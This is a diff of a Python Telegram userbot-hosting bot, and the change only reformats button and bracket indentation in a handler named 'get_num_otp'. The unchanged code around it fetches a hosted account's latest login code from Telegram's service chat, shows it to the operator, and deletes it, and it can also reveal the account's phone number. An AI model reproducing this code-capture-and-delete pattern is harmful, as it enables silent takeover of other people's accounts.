@@ -340,37 +340,33 @@ async def get_num_otp(client, callback_query):
         )
     for X in ubot._ubot:
         button = [
-                [
-                    InlineKeyboardButton(
-                        "📁 ʜᴀᴘᴜs ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀsᴇ 📁",
-                        callback_data=f"del_ubot {ubot._ubot[int(query[2])].me.id}",
-                    )
-                ],
-                [
-                    InlineKeyboardButton(
-                        "⏳ ᴄᴇᴋ ᴍᴀsᴀ ᴀᴋᴛɪғ ⏳",
-                        callback_data=f"cek_masa_aktif {ubot._ubot[int(query[2])].me.id}",
-                    )
-                ],
-                [
-                    InlineKeyboardButton(
-                        "🔑 ɢᴇᴛ ᴋᴏᴅᴇ ᴏᴛᴘ",
-                        callback_data=f"get_otp {ubot._ubot[int(query[2])].me.id} {int(query[2])}",
-                    ),
-                    InlineKeyboardButton(
-                        "ɢᴇᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ 📲",
-                        callback_data=f"get_phone {ubot._ubot[int(query[2])].me.id} {int(query[2])}",
-                    ),
-                ],
-                [
-                    InlineKeyboardButton(
-                        "⬅️", callback_data=f"prev_ub {int(query[2])}"
-                    ),
-                    InlineKeyboardButton(
-                        "➡️", callback_data=f"next_ub {int(query[2])}"
-                    ),
-                ],
-            ]
+            [
+                InlineKeyboardButton(
+                    "📁 ʜᴀᴘᴜs ᴅᴀʀɪ ᴅᴀᴛᴀʙᴀsᴇ 📁",
+                    callback_data=f"del_ubot {ubot._ubot[int(query[2])].me.id}",
+                )
+            ],
+            [
+                InlineKeyboardButton(
+                    "⏳ ᴄᴇᴋ ᴍᴀsᴀ ᴀᴋᴛɪғ ⏳",
+                    callback_data=f"cek_masa_aktif {ubot._ubot[int(query[2])].me.id}",
+                )
+            ],
+            [
+                InlineKeyboardButton(
+                    "🔑 ɢᴇᴛ ᴋᴏᴅᴇ ᴏᴛᴘ",
+                    callback_data=f"get_otp {ubot._ubot[int(query[2])].me.id} {int(query[2])}",
+                ),
+                InlineKeyboardButton(
+                    "ɢᴇᴛ ᴘʜᴏɴᴇ ɴᴜᴍʙᴇʀ 📲",
+                    callback_data=f"get_phone {ubot._ubot[int(query[2])].me.id} {int(query[2])}",
+                ),
+            ],
+            [
+                InlineKeyboardButton("⬅️", callback_data=f"prev_ub {int(query[2])}"),
+                InlineKeyboardButton("➡️", callback_data=f"next_ub {int(query[2])}"),
+            ],
+        ]
         if int(query[1]) == X.me.id:
             if query[0] == "get_otp":
                 async for otp in X.search_messages(777000, limit=1):
@@ -381,9 +377,9 @@ async def get_num_otp(client, callback_query):
                             )
                         else:
                             await callback_query.edit_message_text(
-                                   otp.text,
-                                    reply_markup=InlineKeyboardMarkup(button),
-                                )
+                                otp.text,
+                                reply_markup=InlineKeyboardMarkup(button),
+                            )
                             await X.delete_messages(X.me.id, otp.id)
                     except Exception as error:
                         return await callback_query.answer(error, True)
@@ -392,7 +388,7 @@ async def get_num_otp(client, callback_query):
                     return await callback_query.edit_message_text(
                         X.me.phone_number,
                         reply_markup=InlineKeyboardMarkup(button),
-                )
+                    )
                 except Exception as error:
                     return await callback_query.answer(error, True)
 
